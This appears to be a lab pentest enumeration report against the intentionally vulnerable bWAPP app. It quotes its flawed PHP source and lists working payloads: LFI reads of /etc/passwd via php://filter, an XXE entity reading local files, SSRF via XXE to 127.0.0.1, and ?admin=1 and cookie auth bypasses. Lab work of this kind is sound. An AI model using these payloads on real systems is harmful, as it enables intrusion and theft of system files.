# Enumeration Findings — bWAPP Mission 2026-03-19-001
**Date:** 2026-03-19
**Target:** 10.10.30.128

---

## Challenge 1: LFI — /rlfi.php

### Source Code Analysis (via LFI on itself)

```php
switch($_COOKIE["security_level"])
{
    case "0":
        $language = $_GET["language"];  // UNSANITIZED — full LFI
        break;
    case "1":
        $language = $_GET["language"] . ".php";  // .php appended — filter bypass needed
        break;
    case "2":
        $available_languages = array("lang_en.php", "lang_fr.php", "lang_nl.php");
        $language = $_GET["language"] . ".php";  // Whitelist (commented out check)
        break;
}
include($language);
```

### Confirmed Exploit Vectors at Level 0 (our session)

| Method | Payload | Result |
|---|---|---|
| Direct path | `/etc/passwd` | root, www-data lines returned |
| PHP wrapper | `php://filter/convert.base64-encode/resource=/etc/passwd` | Full file base64 encoded |
| Source read | `php://filter/convert.base64-encode/resource=xxe-2.php` | Full PHP source |

### Level 1 Bypass Analysis
At security_level=1, `.php` is appended. php://filter would become:
`php://filter/convert.base64-encode/resource=/etc/passwd.php` — which fails since /etc/passwd.php doesn't exist.
**Bypass**: Use `php://filter/read=convert.base64-encode/resource=php://input` with POST body, OR use double encoding tricks.

### Sensitive Files Read via LFI
- `/etc/passwd` — confirmed root:x:0:0, www-data:x:33:33
- `/var/www/html/bugs.txt` — full challenge map
- `/var/www/html/rlfi.php` — source code
- `/var/www/html/xxe-2.php` — source code (see below)
- `/var/www/html/smgmt_admin_portal.php` — source code (see below)

---

## Challenge 2: XXE — /xxe-2.php

### Source Code Analysis

```php
$body = file_get_contents("php://input");

// LOW security (security_level != "1" and != "2")
$xml = simplexml_load_string($body);  // External entities ENABLED

$login = $xml->login;
$secret = $xml->secret;

// SQL UPDATE — also injectable!
$sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'";
```

### Key Findings
1. **External entities are enabled** at ALL security levels (libxml_disable_entity_loader commented out)
2. **Login field is taken from XML** at low, from `$_SESSION["login"]` at medium/high
3. **secret field is NOT escaped** at low security — secondary SQLi possible
4. **XXE attack surface**: SYSTEM entity can read arbitrary files and return via `<secret>` element

### XXE SSRF Vector
The `simplexml_load_string()` call will process SYSTEM entities including `http://` URLs when allow_url_fopen=On.
This allows server-side requests to internal network resources via XXE SYSTEM entity.

### Enumeration Payload (safe test)
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<reset><login>bee</login><secret>&xxe;</secret></reset>
```

---

## Challenge 3: Broken Auth — /smgmt_admin_portal.php

### Source Code Analysis

| Security Level | Auth Check | Exploit |
|---|---|---|
| 0 (low) | `$_GET["admin"] == "1"` | URL: `?admin=1` |
| 1 (medium) | `$_COOKIE["admin"] == "1"` | Cookie manipulation: `admin=1` |
| 2 (high) | `$_SESSION["admin"] == 1` | Requires DB-level admin flag |

**Current session: security_level=0** — URL param exploit is simplest and immediately viable.

For medium: server sets `admin=0` cookie automatically. Attacker simply changes cookie value to `1`.

### Cookie Properties Confirmed
- PHPSESSID: **no HttpOnly flag** (session hijack viable in XSS chaining)
- admin cookie: **httponly=false** (accessible via JS — confirmed by `setcookie("admin","0",...,false,false)`)

---

## Challenge 4: SSRF via XXE

### Architecture
- bWAPP's "SSRF" challenge (ssrf.php) is an informational page
- Actual SSRF is achieved via XXE SYSTEM entity with http:// URL
- `allow_url_fopen=On` means `file_get_contents("http://...")` works
- The XML parser resolves SYSTEM entities using PHP's stream wrappers

### Internal Network Discovery
Target is a Docker container (Ubuntu 14.04). Internal gateway likely at 172.17.0.1 or 10.10.30.1.
XXE SSRF can enumerate internal ports by timing responses.

---

## Exploit Plan Summary

| Challenge | Attack Type | Payload | Expected Result |
|---|---|---|---|
| LFI Sensitive Data | file_inclusion | `/etc/passwd`, `php://filter` | File content disclosure |
| XXE Exfil | xxe | SYSTEM entity `file:///etc/passwd` | File content in response |
| SSRF via XXE | ssrf | SYSTEM entity `http://127.0.0.1/` | Internal HTTP response |
| Broken Auth (low) | broken_auth | GET `?admin=1` | "Cowabunga" admin message |
| Broken Auth (medium) | broken_auth | Cookie `admin=1` | "Cowabunga" admin message |
